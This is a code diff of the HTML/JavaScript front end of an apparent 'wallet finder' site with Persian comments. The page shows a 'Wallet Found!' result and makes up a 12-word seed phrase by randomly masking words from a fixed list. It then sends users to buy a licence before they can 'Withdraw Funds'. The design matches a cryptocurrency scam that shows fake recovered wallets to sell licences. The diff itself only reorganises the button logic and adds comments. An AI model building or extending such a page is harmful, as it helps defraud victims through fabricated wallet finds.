@@ -71,36 +71,37 @@
 <body>
   <div class="result-box">
     <h1>🎉 Wallet Found!</h1>
-    <div class="wallet-info" id="walletInfo">
-      Loading...
-    </div>
+    <div class="wallet-info" id="walletInfo">Loading...</div>
     <div class="mnemonic" id="mnemonicWords"></div>
-    <button class="btn" id="licenseBtn">Activate Wallet</button>
+    <button class="btn" id="licenseBtn">Loading...</button>
   </div>
 
   <script>
     const API_BASE_URL = "https://dolphinwalletfinderbackend-production.up.railway.app/api";
-
     const token = localStorage.getItem("token");
+
     if (!token) {
       alert("Please log in first.");
       window.location.href = "login.html";
     }
 
-    function checkLicenseStatus() {
+    // چک کردن وضعیت لایسنس و تغییر متن دکمه
+    function checkLicenseAndSetButton() {
       fetch(`${API_BASE_URL}/license/status`, {
         headers: { "Authorization": "Bearer " + token }
       })
       .then(res => res.json())
       .then(data => {
-        if (data.license !== "active") {
-          document.getElementById("licenseBtn").onclick = () => {
-            window.location.href = "license.html";
+        const licenseBtn = document.getElementById("licenseBtn");
+        if (data.license === "active") {
+          licenseBtn.textContent = "Withdraw Funds";
+          licenseBtn.onclick = () => {
+            window.location.href = "transaction.html";
           };
         } else {
-          document.getElementById("licenseBtn").textContent = "Withdraw Funds";
-          document.getElementById("licenseBtn").onclick = () => {
-            window.location.href = "transaction.html";
+          licenseBtn.textContent = "Activate Wallet";
+          licenseBtn.onclick = () => {
+            window.location.href = "license.html";
           };
         }
       })
@@ -109,6 +110,7 @@
       });
     }
 
+    // گرفتن اطلاعات ولت از سرور
     function loadWalletData() {
       fetch(`${API_BASE_URL}/my-wallet`, {
         headers: { "Authorization": "Bearer " + token }
@@ -132,6 +134,7 @@
           <strong>Last Transaction:</strong> ${wallet.lastTx}
         `;
 
+        // تولید ۱۲ کلمه مومنتیک با ماسک تصادفی
         const allWords = [
           "trouble", "filter", "gallery", "oxygen", "salmon", "silent",
           "pistol", "bounce", "diamond", "trigger", "planet", "furnace",
@@ -159,8 +162,9 @@
       });
     }
 
+    // اجرای توابع بعد از لود صفحه
     loadWalletData();
-    checkLicenseStatus();
+    checkLicenseAndSetButton();
   </script>
 </body>
 </html>
